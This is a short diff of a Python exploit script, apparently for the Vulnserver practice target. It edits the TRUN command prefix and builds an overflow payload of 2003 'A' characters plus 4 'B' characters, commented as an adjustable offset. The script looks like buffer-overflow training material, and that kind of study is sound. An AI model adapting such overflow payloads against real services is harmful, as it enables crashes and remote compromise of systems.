@@ -19,7 +19,7 @@ print('                                 Version: 1.0')
 print('--------------------------------------------------------------------------------')
 
 
-command = 'TRUN /.:/ '
+command = 'TRUN /.:/'
 payload = 'A' * 2003 + 'B' * 4 #CHANGE OFFSET AS NEEDED
 
 try:
